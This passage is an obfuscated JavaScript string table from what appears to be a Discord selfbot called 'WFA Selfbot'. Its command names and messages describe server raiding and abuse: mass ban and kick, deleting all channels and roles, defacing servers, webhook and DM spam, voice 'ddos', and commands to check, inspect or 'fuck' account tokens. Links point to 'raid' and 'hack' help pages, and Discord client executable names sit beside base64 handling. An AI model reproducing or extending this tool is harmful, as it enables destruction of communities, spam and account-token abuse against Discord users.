    'ynsqY': function (H, I) {
      return H + I;
    },
    'CRQgY': 'None',
    'tetyi': '\n\nEmojis Simple:\n[',
    'nuzIr': '] \n',
    'ZwIjP': '\n\nTotal d\'emojis: [',
    'UariH': function (H, I) {
      return H + I;
    },
    'zpxPD': function (H, I) {
      return H + I;
    },
    'WAYva': '[COMMANDE] Commande emote executé',
    'ijjhP': 'remove emote',
    'HhcVX': ':white_check_mark: **Emote correctement supprimée du serveur.**',
    'cOsGZ': function (H, I) {
      return H !== I;
    },
    'CoESJ': 'rRSuh',
    'LRYCe': function (H, I) {
      return H + I;
    },
    'mErKs': ':x: **Veuillez choisir une emote valide**!',
    'gkuTz': ':x: **Vous ne pouvez pas supprimer les emotes par defaut**!',
    'ljIgD': '[COMMANDE] Commande remove emote executé',
    'BdJer': function (H, I) {
      return H + I;
    },
    'CwJoE': function (H, I) {
      return H === I;
    },
    'CixAz': '[NSFW]',
    'Ojtdq': ' Les commandes NSFW sont désactivés',
    'FpQwB': 'neKpS',
    'LeJmR': 'gxXks',
    'GawLA': 'nsfw-gif',
    'QZdnA': 'Vfkav',
    'UYWKq': function (H, I) {
      return H === I;
    },
    'Prdem': function (H, I) {
      return H !== I;
    },
    'HGdLZ': 'QzSUB',
    'CrZCq': function (H, I) {
      return H + I;
    },
    'pcUEs': 'hentai',
    'aOXsV': function (H, I) {
      return H + I;
    },
    'ijUnM': 'pussy',
    'EyItB': function (H, I) {
      return H + I;
    },
    'DUKtf': 'thigh',
    'nOGXa': function (H, I) {
      return H === I;
    },
    'QMfxi': function (H, I) {
      return H + I;
    },
    'jffun': 'anal',
    'feiGc': function (H, I) {
      return H === I;
    },
    'IGSbZ': function (H, I) {
      return H === I;
    },
    'ohNvc': 'nfxyW',
    'sIMMI': function (H, I) {
      return H !== I;
    },
    'HmOAO': 'uaQzj',
    'YoVEe': function (H, I) {
      return H + I;
    },
    'DCKIg': function (H, I) {
      return H === I;
    },
    'anYLa': 'aKoqH',
    'RyJcX': 'EWDVs',
    'PpVxf': 'spotify:ab67616d0000b2739501a78fed26d59bb86d1d9e',
    'OjAxE': function (H, I) {
      return H + I;
    },
    'rDwoF': function (H, I) {
      return H + I;
    },
    'NDstO': ':white_check_mark: **Tu écoutes ',
    'gYZuc': ' sur spotify**',
    'chuYV': '[COMMANDE] Commande spotify executé',
    'JIEzY': 'reset',
    'QZTKr': ':information_source:  Votre statut a été réinitialisé ! :information_source:',
    'bJgci': '[COMMANDE] Commande reset executé',
    'PrqgO': 'fmBXu',
    'aqAKo': 'JVEGn',
    'KJTmm': function (H, I) {
      return H + I;
    },
    'JwcuQ': 'lacoste',
    'zxCNz': function (H, I) {
      return H + I;
    },
    'ZfVAd': function (H, I) {
      return H + I;
    },
    'lJnej': function (H, I) {
      return H + I;
    },
    'neuxJ': function (H, I) {
      return H * I;
    },
    'OWQNw': 'ybvyp',
    'YaIzW': 'skype',
    'NYKnw': 'facebook',
    'OKCLB': function (H, I) {
      return H + I;
    },
    'OiaLD': 'tiktok',
    'OoSkt': function (H, I) {
      return H + I;
    },
    'cJJiK': function (H, I) {
      return H + I;
    },
    'cWyTg': 'instagram',
    'qnToc': function (H, I) {
      return H !== I;
    },
    'vQHuE': 'IBmPh',
    'jIbtB': 'tokyo ghoul',
    'YndEE': 'dgWvX',
    'KYWEe': 'tokyo',
    'RxYzq': 'hunter x hunter',
    'LkVDy': function (H, I) {
      return H === I;
    },
    'aTgmX': 'AfmRc',
    'MiRlC': 'CUyac',
    'bXqPm': 'hxh',
    'LvrnV': function (H, I) {
      return H + I;
    },
    'CgWZP': 'DTmsj',
    'CPgpd': 'pornhub',
    'JIVlL': '721465320740487179',
    'oDAxA': 'clash-of-clans-app-icon',
    'ujkYT': function (H, I) {
      return H === I;
    },
    'hGogh': 'dmeRc',
    'RqbdZ': 'clashroyal',
    'uFYiv': function (H, I) {
      return H + I;
    },
    'aapFz': 'roblox',
    'RyRfM': function (H, I) {
      return H === I;
    },
    'FfEva': 'SPKUH',
    'IssjW': function (H, I) {
      return H + I;
    },
    'JJtTT': 'badlion',
    'qpnMG': 'EVIdM',
    'RVKDV': 'JBdie',
    'FMvOZ': function (H, I) {
      return H + I;
    },
    'ufaEw': function (H, I) {
      return H !== I;
    },
    'naIan': 'JtNoP',
    'aJgrY': 'mjnCG',
    'ozoRq': 'apex',
    'bsmOE': function (H, I) {
      return H + I;
    },
    'htgwK': 'csgo',
    'FQZph': 'among us',
    'PEuiC': function (H, I) {
      return H + I;
    },
    'eCNKM': 'JlFxS',
    'sBuec': 'ftJTT',
    'oFyTx': 'fortnite',
    'LFMiv': function (H, I) {
      return H + I;
    },
    'iUHel': 'rocket league',
    'bZSzz': 'WtASC',
    'ImIQu': 'rocket_league',
    'qCeAa': '[COMMAND] naruto command executed',
    'CAChK': 'rcdkz',
    'EAvsT': 'wfcxL',
    'jauWW': function (H, I) {
      return H === I;
    },
    'UiPvI': function (H, I) {
      return H === I;
    },
    'vwDbG': '[EVENT] Contient: ',
    'NLbFy': function (H, I) {
      return H + I;
    },
    'agEad': '0|2|4|1|3',
    'qZuDz': function (H, I) {
      return H + I;
    },
    'kEAGH': function (H, I) {
      return H === I;
    },
    'dwSWH': '5|4|3|6|7|1|0|2',
    'UScrG': '@here',
    'pbWoA': function (H, I) {
      return H !== I;
    },
    'CStyH': 'RPJbo',
    'adEUx': 'ZkbOH',
    'Qdzop': '[EVENT] Nouveau GhostPing:',
    'Fczeq': function (H, I) {
      return H + I;
    },
    'dwfDJ': '[EVENT] Serveur: ',
    'PkGAD': '[EVENT] Salon: ',
    'pjwnk': function (H, I) {
      return H + I;
    },
    'dwDAe': function (H, I) {
      return H !== I;
    },
    'MySfT': 'vXPIU',
    'zrums': function (H, I, J) {
      return H(I, J);
    },
    'RgixJ': 'edi',
    'gbovO': function (H, I) {
      return H !== I;
    },
    'JMNcZ': function (H, I) {
      return H == I;
    },
    'DKGos': function (H, I) {
      return H == I;
    },
    'yAEoI': function (H, I) {
      return H === I;
    },
    'UEIvD': 'rVspT',
    'VXTNv': '*/*',
    'dLryL': 'en-US',
    'ssDyn': 'canary.discordapp.com',
    'gWAUG': 'Windows',
    'JCZla': 'Firefox',
    'ptgDr': '66.0',
    'ZjNqj': 'canary',
    'OQOAB': 'base64',
    'GMeHB': 'DiscordCanary.exe',
    'BgKCt': 'DiscordPTB.exe',
    'ATqLh': 'DiscordPTB',
    'mbiWu': 'DiscordDevelopment.exe',
    'qcIqI': 'DiscordDevelopment',
    'jXNTi': function (H, I) {
      return H === I;
    },
    'qyXha': 'FmDEA',
    'bTjZd': '[EVENT] Vous avez quitté le serveur ',
    'UsHBN': '2|0|4|1|3',
    'XkzqR': '[EVENT] Vous avez rejoint le serveur ',
    'DSriL': '[COMMAND] nuke dm command executed',
    'DoouR': 'SnNjp',
    'XDKlY': 'Token invalid!\nChange ton token dans le config.json',
    'fYDsM': '[COMMANDE] Commande apex executé',
    'tfsLa': function (H) {
      return H();
    },
    'clKGQ': function (H, I) {
      return H + I;
    },
    'eHrBN': 'wkZHr',
    'VRODT': 'off',
    'qxfvT': 'oQNyl',
    'haSnm': function (H, I) {
      return H === I;
    },
    'qrOZt': 'LlNpM',
    'hktzG': function (H, I, J) {
      return H(I, J);
    },
    'RENYw': 'blue',
    'HQaKS': 'itRlq',
    'ThpOd': 'CrhHS',
    'dEedM': 'yes',
    'FeHrk': 'pwAsg',
    'KRSPf': '777619769637339156',
    'wfKMy': '𝐖𝐞 𝐅𝐮𝐜𝐤 𝐀𝐥𝐥',
    'sZvFA': 'wfa_logo',
    'WURgq': ':x: **Command not executable in dm**',
    'tHzdn': 'XBEhR',
    'NNmnz': function (H, I) {
      return H !== I;
    },
    'CkKgj': 'iraLm',
    'EkJbn': function (H, I) {
      return H + I;
    },
    'nVQPX': '[EVENT] The user ',
    'FuDts': ' just pinged you on your afk',
    'nyQRk': function (H, I) {
      return H + I;
    },
    'sykLg': function (H, I) {
      return H === I;
    },
    'Otlkv': 'WZMpr',
    'QGPGh': function (H) {
      return H();
    },
    'kDYky': function (H, I) {
      return H + I;
    },
    'ldFhp': 'fTMue',
    'izghJ': function (H) {
      return H();
    },
    'LDJOw': '[COMMAND] csgo command executed',
    'lJMjE': 'YFziC',
    'LtvmU': function (H, I, J, K, L) {
      return H(I, J, K, L);
    },
    'UMWvF': function (H, I) {
      return H === I;
    },
    'mKMJQ': 'lPSid',
    'GNwqR': 'IeoyM',
    'lvgNZ': '4|3|1|2|0',
    'yOxxd': function (H, I) {
      return H + I;
    },
    'fVGvV': function (H, I) {
      return H + I;
    },
    'odSQB': ', it\'s possible I don\'t have the permissions :/',
    'DFKMS': function (H, I) {
      return H + I;
    },
    'RFSWB': function (H, I) {
      return H + I;
    },
    'saKyJ': '[EVENT] I reacted correctly to the giveaway on ',
    'ikDeA': 'ms I am super fast hehe ;)',
    'QXySC': function (H, I) {
      return H * I;
    },
    'VCjIW': function (H, I, J) {
      return H(I, J);
    },
    'cQGoV': function (H, I) {
      return H == I;
    },
    'pBDbi': function (H, I) {
      return H == I;
    },
    'RCUen': 'cHnZm',
    'jgFty': '[EVENT] GG I made you win the giveaway on the server ',
    'AIWzQ': function (H, I, J) {
      return H(I, J);
    },
    'vPcZp': '⏲️**Group lock avec succès !**',
    'iIzAI': 'Commande lock groupe executé',
    'mBYAz': function (H, I) {
      return H(I);
    },
    'dtqUN': '[COMMAND] dm all stoped',
    'fIXHW': 'urGbK',
    'fzxUI': function (H, I) {
      return H !== I;
    },
    'vydCF': 'dxwRo',
    'xWSQq': 'BregQ',
    'skbqZ': 'All Ban',
    'DbZkb': 'All kick',
    'CMotv': function (H, I) {
      return H + I;
    },
    'FZZIx': 'mcRhF',
    'iPywb': 'MANAGE_MESSAGES',
    'WYLye': function (H, I) {
      return H + I;
    },
    'lpLTB': '[DM Send]  |',
    'LdPSn': function (H) {
      return H();
    },
    'iSqIB': function (H, I, J) {
      return H(I, J);
    },
    'Nczrf': function (H) {
      return H();
    },
    'tPYkO': '[COMMAND] youtube command executed',
    'NWqDW': ':white_check_mark: **You watch ',
    'KFwgn': function (H, I) {
      return H !== I;
    },
    'PEvVF': 'nMhYy',
    'bxYck': function (H, I) {
      return H == I;
    },
    'iouFC': 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRXOybiPRVaDnYzQz9gA3ijBLfJFoxw_4zb9w&usqp=CAU',
    'HxVMK': 'lwWFM',
    'MjkXE': 'NwTvr',
    'uFelx': 'flags',
    'ZjHxT': 'nsfw_allowed',
    'FhpZu': function (H, I) {
      return H + I;
    },
    'jtXNJ': '\nId: ',
    'JpuvZ': function (H, I) {
      return H + I;
    },
    'WnWRP': function (H, I) {
      return H + I;
    },
    'elLMl': '\nNsfw activé?: ',
    'ubBwp': '[COMMAND] info token command executed',
    'HqDYK': function (H, I) {
      return H === I;
    },
    'KCHDQ': 'nOqzD',
    'BmMqb': 'QcWbT',
    'VhWHD': 'google',
    'RSHPL': '[COMMANDE] Commande ddos voc stopée',
    'xfOmz': function (H) {
      return H();
    },
    'OPbLN': '[COMMAND] anti groupe command executed',
    'adewe': function (H, I) {
      return H + I;
    },
    'WbWQm': function (H, I) {
      return H + I;
    },
    'WxYst': function (H, I) {
      return H * I;
    },
    'uhCiC': ':x: **Please run this command on a server!**',
    'YRFMC': 'BbEfq',
    'gwzDA': function (H, I) {
      return H === I;
    },
    'AJZxa': function (H, I) {
      return H < I;
    },
    'aqrer': function (H, I) {
      return H * I;
    },
    'DCfFp': '1|0|5|4|6|3|2',
    'KnyJK': function (H, I) {
      return H + I;
    },
    'DUFsz': function (H, I) {
      return H + I;
    },
    'MZwoC': function (H, I) {
      return H !== I;
    },
    'rHmPn': 'UByXt',
    'wdZSs': '```diff\n + the token:',
    'YvlQi': '```diff\n- The token ',
    'tNVsb': '[COMMAND] check token command executed',
    'vLmCX': 'https://help.wfaself.repl.co',
    'uAgDE': function (H, I) {
      return H !== I;
    },
    'TvaCZ': 'BSOBN',
    'apDSg': 'FJVZB',
    'MeRMc': 'Pkndf',
    'kCLMK': function (H, I) {
      return H + I;
    },
    'JLAFR': function (H, I) {
      return H + I;
    },
    'EkQXB': function (H, I) {
      return H + I;
    },
    'IiXVU': function (H, I) {
      return H + I;
    },
    'zlTVF': function (H, I) {
      return H - I;
    },
    'sPvpD': function (H, I) {
      return H * I;
    },
    'aChBt': '[COMMAND] badlion command executed',
    'yjjAi': function (H, I) {
      return H + I;
    },
    'SxyLX': '[COMMAND] laugh command executed',
    'BvJEZ': 'PjuLh',
    'Irjpa': function (H, I) {
      return H <= I;
    },
    'zjJHs': function (H, I) {
      return H + I;
    },
    'fSbZL': function (H, I) {
      return H - I;
    },
    'RAcqV': function (H, I) {
      return H / I;
    },
    'oHDBs': function (H, I) {
      return H + I;
    },
    'eAszD': ']```',
    'bqkAS': function (H, I) {
      return H === I;
    },
    'FUkXS': function (H) {
      return H();
    },
    'MjphA': '[COMMAND] fortnite command executed',
    'kDWTa': ':white_check_mark: **You play ',
    'PXdnu': ' on fortnite**',
    'uVrgp': 'Brngf',
    'VsYSX': function (H, I) {
      return H + I;
    },
    'tcREH': ' I can\'t ban this person',
    'JBNpZ': function (H, I) {
      return H + I;
    },
    'TBbuR': '[COMMAND] ass command executed',
    'Afcxp': '[COMMANDE] Commande restart executé',
    'CSjcO': function (H, I) {
      return H + I;
    },
    'vpztT': 'EtgFW',
    'hyEXg': function (H, I) {
      return H + I;
    },
    'ggbKj': function (H, I) {
      return H === I;
    },
    'RWepU': 'UpJBs',
    'LpUDn': '[COMMAND] gucci command executed',
    'lzXYh': function (H, I) {
      return H + I;
    },
    'xCXWa': ' on Gucci**',
    'cqgOk': function (H, I) {
      return H + I;
    },
    'ZqUSs': ' is not valid :x:```',
    'xLmAd': 'aovtL',
    'CHWPe': function (H, I) {
      return H + I;
    },
    'WecuA': function (H, I) {
      return H + I;
    },
    'SGaMk': '[COMMAND] google command executed',
    'VkJwN': function (H, I) {
      return H + I;
    },
    'Nxnvb': ' on google**',
    'iiaSG': '[COMMAND] skype command executed',
    'RePPM': function (H, I) {
      return H + I;
    },
    'HwAgl': function (H, I) {
      return H + I;
    },
    'HQwmd': ' on Skype**',
    'tOwDL': 'iWDBI',
    'gcxbE': function (H, I) {
      return H + I;
    },
    'VcwWh': function (H, I) {
      return H + I;
    },
    'zdENJ': ' on Snapchat**',
    'mUoQr': '[EVENT] WFA Selfbot stoped',
    'ZFAOZ': function (H, I) {
      return H === I;
    },
    'TjnCd': 'QRKdg',
    'XZRzh': '[COMMAND] tiktok command executed',
    'rgIbI': function (H, I) {
      return H + I;
    },
    'TVRPz': ' on Tiktok**',
    'xmjSB': '[COMMAND] twitter command executed',
    'uvCbE': function (H, I) {
      return H + I;
    },
    'XiHSR': ' on Twitter**',
    'zytUw': function (H) {
      return H();
    },
    'FClTz': 'xjmme',
    'QaQUx': 'pizwS',
    'fidHp': '[COMMAND] hunter x hunter command executed',
    'abiXS': function (H, I) {
      return H !== I;
    },
    'KtbSt': 'xJKwW',
    'wuGio': 'lULEK',
    'tiNfh': function (H) {
      return H();
    },
    'KXlns': '[COMMAND] clash of clans command executed',
    'ESMka': function (H, I) {
      return H * I;
    },
    'NUzxM': function (H, I) {
      return H === I;
    },
    'dslzv': 'lyFiZ',
    'KXPUT': 'mfMYm',
    'tFNJc': '[COMMAND] minecraft command executed',
    'mZHIr': function (H, I) {
      return H + I;
    },
    'Lestm': '[COMMAND] set serveur name command executed',
    'PZRZS': function (H, I) {
      return H !== I;
    },
    'gDgPI': 'bAAxS',
    'njwla': 'Counter Strike',
    'qSmqj': '[COMMAND] nike command executed',
    'axydp': function (H, I) {
      return H !== I;
    },
    'HZzAm': 'XfyUx',
    'hAEie': '[COMMAND] clash royale command executed',
    'xlOpt': '[COMMAND] restart command executed',
    'wosic': function (H, I) {
      return H === I;
    },
    'IYzcR': 'Il te manque des permissions',
    'ESpIG': function (H, I) {
      return H + I;
    },
    'XEbuo': function (H, I) {
      return H + I;
    },
    'KYrbs': 'xKPBZ',
    'Xplcb': 'YXegT',
    'nmBxy': 'brazil',
    'AyWYi': '**Commande ddos vocal activé**',
    'HshuG': function (H, I) {
      return H + I;
    },
    'DfbgO': ' / ',
    'HOaCH': function (H, I, J) {
      return H(I, J);
    },
    'wsFtu': '[COMMAND] start bumping command executed',
    'WiNWk': function (H) {
      return H();
    },
    'NVpAI': 'BE INSTRUCT WITH WFA',
    'ESCEf': function (H, I) {
      return H + I;
    },
    'CpOEy': function (H, I) {
      return H + I;
    },
    'DRFBO': ' sur google**',
    'tzhiQ': '[COMMAND] 4k command executed',
    'CURdq': function (H) {
      return H();
    },
    'glZhk': function (H, I, J) {
      return H(I, J);
    },
    'DNKix': function (H, I) {
      return H + I;
    },
    'jtBDX': '\n\n***you can copy and paste the list on the current channel and then you can right click on a nickname / send a message / add friend ect...```',
    'ZlPxi': function (H, I) {
      return H(I);
    },
    'SusuI': '879157124230414406',
    'oyeBv': function (H, I) {
      return H === I;
    },
    'MwdbN': 'PUT',
    'TDTuw': '25%',
    'LtVIm': '30%',
    'Gnblb': '50%',
    'KTXpC': 'URCrg',
    'AEDVO': function (H, I) {
      return H !== I;
    },
    'AWSvV': 'ifDFa',
    'mShJU': 'QCXfr',
    'tWaqx': function (H, I, J) {
      return H(I, J);
    },
    'kkOOD': function (H, I, J) {
      return H(I, J);
    },
    'YPHnS': '[COMMANDE] Commande pornhub executé',
    'hECsw': '\nCompte vérifié?: ',
    'gLWrp': function (H, I) {
      return H !== I;
    },
    'Vzhhx': 'uQOne',
    'buwKy': 'oeMal',
    'vpCen': 'IIfVC',
    'VOQLB': 'UVbAR',
    'wGBrj': '[COMMANDE] Commande delete all emote executé',
    'DVcaI': function (H, I) {
      return H(I);
    },
    'RypdU': function (H) {
      return H();
    },
    'ycnbu': '[COMMAND] add emote command executed',
    'HZRui': ' I can\'t kick this person',
    'oNXiZ': 'goSQc',
    'JmfaU': '4|0|3|2|1|5',
    'amgfO': '[EVENT] A nitro has probably been added to your credits',
    'QBvhf': 'WKRdY',
    'LxHem': 'HdZaB',
    'YWdco': 'MtiMJ',
    'lDAxy': '```diff\n + Le token:',
    'PQtxz': '[COMMANDE] Commande check token executé',
    'mLQao': 'Ktmtt',
    'FWZKV': function (H, I) {
      return H + I;
    },
    'VfioX': function (H) {
      return H();
    },
    'jYyPC': 'HbHBK',
    'bzfPS': '[COMMAND] facebook command executed',
    'NIFXP': '[COMMAND] instagram command executed',
    'mzbNo': function (H, I) {
      return H + I;
    },
    'JKRuv': function (H) {
      return H();
    },
    'kxZFH': 'HffEk',
    'feiMq': 'Tinder',
    'YOKWp': function (H) {
      return H();
    },
    'ZoHYO': function (H, I) {
      return H + I;
    },
    'bFLti': 'Rpc',
    'FbfSj': function (H, I) {
      return H + I;
    },
    'tfvMl': function (H, I) {
      return H == I;
    },
    'UTWsP': 'CaHev',
    'vigGK': 'WStvv',
    'qZFwG': function (H) {
      return H();
    },
    'iMAJu': '[COMMAND] afk stopped',
    'jVMWe': function (H, I) {
      return H === I;
    },
    'ZRTPj': '5|2|6|0|4|3|1',
    'ushvf': function (H, I) {
      return H + I;
    },
    'pLqSu': function (H, I) {
      return H + I;
    },
    'MaPcf': function (H, I) {
      return H + I;
    },
    'dMpFJ': 'discord.gg',
    'SeQNO': function (H, I) {
      return H + I;
    },
    'ttdpQ': '[EVENT] The bot ',
    'uPjsd': ' has sent you a discord invitation',
    'NCZVY': function (H, I) {
      return H + I;
    },
    'KPjeY': function (H, I) {
      return H !== I;
    },
    'bllwY': function (H, I) {
      return H + I;
    },
    'CEzkn': '[COMMAND] cmd command executed',
    'IbxSv': 'help',
    'kSNfU': function (H, I) {
      return H + I;
    },
    'wzdLM': '[COMMAND] help command executed',
    'OKkbw': function (H, I) {
      return H === I;
    },
    'zkdtb': 'ophPy',
    'RREJY': 'BkMHW',
    'VpHiG': function (H, I) {
      return H + I;
    },
    'MfxzK': function (H, I) {
      return H + I;
    },
    'twHcH': 'https://en-hack.wfaself.repl.co',
    'UVAPi': 'tHKMU',
    'mHjxG': 'https://en-raid.wfaself.repl.co',
    'rUUmi': 'help status',
    'DXfkl': function (H, I) {
      return H + I;
    },
    'knUPU': '[COMMAND]e help status command executed',
    'IGzsM': function (H, I) {
      return H + I;
    },
    'gGoeH': 'QxAgu',
    'Ujvwo': 'https://en-backup.wfaself.repl.co',
    'AZGXd': function (H, I) {
      return H + I;
    },
    'yYXpf': 'https://en-mod.wfaself.repl.co',
    'JfDmG': 'yBWws',
    'KvsQR': 'kfvCj',
    'wWXfq': 'https://en-util.wfaself.repl.co\nhttps://en-util-1.wfaself.repl.co/\nhttps://en-util-2.wfaself.repl.co/\nhttps://en-util-3.wfaself.repl.co/',
    'ClBWJ': function (H, I) {
      return H + I;
    },
    'bHHvu': 'delete all channels',
    'ajzWY': 'nOUsy',
    'WpTYe': 'delete all roles',
    'IJrVN': function (H, I) {
      return H !== I;
    },
    'uiAWF': 'oUFst',
    'Skjij': 'sHZqy',
    'uPZfH': 'BUvRx',
    'ZQSLM': '[COMMAND] delete all role command executed',
    'RLBSo': function (H, I) {
      return H + I;
    },
    'dPVQU': function (H, I) {
      return H + I;
    },
    'eGlkr': 'all ban',
    'Btyip': function (H, I) {
      return H === I;
    },
    'jptyV': ':x: **Cette commande ne marche que sur un serveur**.',
    'CVjzC': function (H, I) {
      return H + I;
    },
    'CShHd': function (H, I) {
      return H === I;
    },
    'QWxES': 'stvtf',
    'gJEKB': function (H, I) {
      return H + I;
    },
    'FayMn': '[COMMAND] Commande mp all stoped',
    'eGwIM': 'deface',
    'MJarz': '6|2|0|1|5|3|4',
    'KTKYg': function (H, I) {
      return H + I;
    },
    'uEQSI': 'https://media.discordapp.net/attachments/812490234427867146/836312989581049886/wfa.jpeg?width=676&height=676',
    'oZkWQ': ':x: **You do not have the permissions to run this command**',
    'kvGfI': function (H, I) {
      return H === I;
    },
    'uBdxp': function (H, I) {
      return H === I;
    },
    'siGiO': function (H, I) {
      return H !== I;
    },
    'kDOEM': 'PGhtb',
    'khUUN': 'MtRNY',
    'gGIHq': '[COMMAND] create channel command executed',
    'ltNYp': function (H, I) {
      return H + I;
    },
    'AMDRP': 'webhook spam',
    'PbagN': function (H, I) {
      return H === I;
    },
    'ZAtti': 'Wdasx',
    'IUuGW': '@everyone\nWFA\nhttps://www.youtube.com/channel/UC6Avt0DUQ2hoU7TeNDOglHg',
    'FoHOu': function (H, I) {
      return H + I;
    },
    'PrwAN': function (H, I, J) {
      return H(I, J);
    },
    'ZfBOQ': function (H, I) {
      return H === I;
    },
    'aJmmm': function (H, I) {
      return H === I;
    },
    'pDDjM': '[COMMAND] get guild banner command executed',
    'hGxWw': '[BANNIERE] Here is the banner: ',
    'icNfh': 'get guild pfp',
    'ZMFdQ': 'PAzWB',
    'VmZBx': function (H, I) {
      return H === I;
    },
    'lxWHD': function (H, I) {
      return H === I;
    },
    'EbpyF': '[COMMAND] get guild pfp command executed',
    'iQGsL': '[BANNIERE] Here is the pfp: ',
    'KSMPV': function (H, I) {
      return H + I;
    },
    'piFTl': 'dm all',
    'kcHjd': '[COMMAND] dm all command executed',
    'zftmL': function (H, I) {
      return H + I;
    },
    'dgCEs': 'stop dm all',
    'KPYyb': 'NcuoP',
    'ZoBda': 'kzpmb',
    'PvAxt': ':x: **Please Mention a user**',
    'qgisv': ':x: **you haven\'t voice-blacklist an user in this server**',
    'WZIjX': ':x: **you haven\'t voice-blacklist this user**',
    'lSWyO': ':white_check_mark: **Auto Voice kick stoped for this user**',
    'SeOZd': 'auto voice kick',
    'bIxTX': function (H) {
      return H();
    },
    'DoxdB': function (H) {
      return H();
    },
    'YlkhP': ':x:**Please mention a user.**',
    'SqRPn': '[COMMAND] voice kick command executed',
    'PwHbB': 'afk',
    'TjTox': function (H) {
      return H();
    },
    'oeccB': ':white_check_mark: **You are afk for**',
    'JlQft': '[COMMAND] afk command executed',
    'HezCB': function (H, I) {
      return H + I;
    },
    'gGCzf': 'anti group on',
    'ydUwt': 'FtLCi',
    'XOPjU': function (H) {
      return H();
    },
    'lqtzr': ':white_check_mark: **you will leave the new groups saying: ** ',
    'yqqfH': ':white_check_mark: **the anti group is deactivated',
    'piDsH': '[COMMAND] anti groupe stopé',
    'xkzXE': '[COMMAND] avatar command executed',
    'VFdGM': function (H, I, J) {
      return H(I, J);
    },
    'MuZQp': ':white_check_mark: **You have joined the hypesquad  \'brilliance\'**',
    'GMtka': function (H, I) {
      return H === I;
    },
    'oNlcu': function (H, I) {
      return H + I;
    },
    'hDSEh': 'change hypesquad bravery',
    'urFcZ': function (H, I) {
      return H === I;
    },
    'ohmWX': 'DyIba',
    'psuoz': function (H, I, J) {
      return H(I, J);
    },
    'aFKGk': function (H, I) {
      return H + I;
    },
    'DOuuF': function (H, I) {
      return H + I;
    },
    'KsZQb': function (H, I) {
      return H + I;
    },
    'mxuMY': function (H, I) {
      return H / I;
    },
    'kBCPi': 'MB\n\nServers: ',
    'jitsf': '\n\nChannels: ',
    'mhUmO': '\n\nMembers: ',
    'lZSqL': '[COMMAND] stats command executed',
    'cWkRi': '##',
    'aSAvV': '[COMMAND] purge command executed',
    'grUSe': function (H, I) {
      return H + I;
    },
    'DfHhI': 'icyxG',
    'rPYag': function (H, I) {
      return H + I;
    },
    'HsvCH': 'https://embed.rauf.workers.dev/?author=Discord%2520Version&description=La%2520version%2520de%2520discord%253A%2520',
    'AWiKU': '[COMMAND] discord command executed',
    'Qyqpr': function (H, I) {
      return H === I;
    },
    'doybn': function (H, I) {
      return H === I;
    },
    'mhukI': 'MtNUp',
    'TXNXm': 'DOAyb',
    'ImoFm': '**restartredémarrage** of the bot...',
    'xLGYD': function (H, I) {
      return H + I;
    },
    'ltNTW': 'set server name',
    'vslUk': 'nRXAM',
    'sdcrX': 'Change the server name to: ',
    'aUFLi': function (H, I) {
      return H + I;
    },
    'HmPPg': 'PUQxu',
    'RvOsu': 'vwolP',
    'mVVfu': 'HircHg',
    'IqSHc': 'XluxwQ',
    'apbaG': 'oZyGJDamSJ4hmJaaLvzdNo1bLqk',
    'SdRJf': function (H, I, J) {
      return H(I, J);
    },
    'hMBzt': function (H, I, J) {
      return H(I, J);
    },
    'aPYDN': function (H, I, J) {
      return H(I, J);
    },
    'baWux': function (H, I, J) {
      return H(I, J);
    },
    'ijlTb': function (H, I, J) {
      return H(I, J);
    },
    'FSPvZ': '[COMMAND] token command executed',
    'xXlFU': function (H, I) {
      return H + I;
    },
    'NlgJM': 'HvBwQ',
    'GQNoD': 'snmGs',
    'APawk': '[EASTER EGG] GG you find an easter egg !',
    'uyLbg': '[EASTER EGG] Sans and KSCH are the designers of WFA Project !',
    'jAoOT': function (H, I) {
      return H + I;
    },
    'FyloE': '[EASTER EGG] KSCH is he the developer of WFA Project !',
    'JuyoA': function (H, I) {
      return H + I;
    },
    'Rwgmq': 'UfcHs',
    'mJYOu': 'steal bannier',
    'GUkvS': function (H, I) {
      return H + I;
    },
    'GcVQd': function (H, I) {
      return H !== I;
    },
    'nYBnN': 'LXCEj',
    'EvRhQ': 'YtjhN',
    'pVRQk': 'QQFZZ',
    'JBlvy': function (H, I) {
      return H + I;
    },
    'PkShB': ':x: **You do not have "Manage emojis" permissions on this server**',
    'UtDQA': ':x: **The server does not contain any emote.**',
    'kNCmK': '[COMMAND] steal emote command executed',
    'gXtpa': 'gjhBG',
    'VpnPa': 'UoCKG',
    'QFJYo': function (H, I) {
      return H < I;
    },
    'kieIw': 'HlYue',
    'ZFfxb': 'VLvVE',
    'HDCER': ':x: **There are no emotes to delete.**',
    'fRjZb': '[COMMAND] delete all emote command executed',
    'xpMmA': 'grab pfp',
    'DrrNq': function (H, I) {
      return H === I;
    },
    'Cygow': 'nVIth',
    'PIsYd': ':x: **Please mention a user valide!**',
    'EjmFV': ':x: **This user does not have an avatar!**',
    'cbtpa': '[COMMAND] grab pfp command executed',
    'scZvQ': function (H, I) {
      return H + I;
    },
    'pyAXs': function (H, I) {
      return H + I;
    },
    'mtlVj': ':white_check_mark: **I correctly stole the profile picture of ** "',
    'cZWTd': function (H, I) {
      return H + I;
    },
    'Kesui': function (H, I) {
      return H + I;
    },
    'FvLaK': function (H, I) {
      return H + I;
    },
    'ZnXjO': 'ddos voc',
    'gvuZp': ':x: **You need administrator permissions to run this command**',
    'PZJje': 'sydney',
    'PFeJb': '[COMMAND] ddos voc command executed',
    'BoMiE': function (H, I) {
      return H === I;
    },
    'dUwqS': 'ddos-stop',
    'Tneln': 'fuck token',
    'EzTWc': function (H, I) {
      return H !== I;
    },
    'YglWY': 'NIupA',
    'SUzpM': '[COMMAND] fuck token command executed',
    'YHKZP': function (H, I) {
      return H + I;
    },
    'IUUww': 'info token',
    'sgClW': function (H, I) {
      return H === I;
    },
    'hpNNp': 'dwXUO',
    'gGEUU': 'lgdqU',
    'zEBHM': function (H, I, J, K) {
      return H(I, J, K);
    },
    'PpyRn': 'xvSYO',
    'tjftN': 'TBYuX',
    'UBLYe': '20%',
    'MQhRk': '95%',
    'AXriJ': function (H, I) {
      return H + I;
    },
    'ZxSzu': function (H, I) {
      return H + I;
    },
    'sybeA': '[COMMAND] start typing command executed',
    'wnPPk': function (H, I) {
      return H + I;
    },
    'HQoyf': function (H, I) {
      return H === I;
    },
    'DleKQ': 'yTkPD',
    'bZbEn': 'no...',
    'jzkLI': 'maybe?',
    'etvmG': 'I don\'t think so.',
    'JlXJP': function (H, I) {
      return H * I;
    },
    'AOFhX': function (H, I) {
      return H + I;
    },
    'KYsTj': 'What\'s your question? :rolling_eyes: (try:',
    'DeCql': '[COMMAND] 8ball command executed',
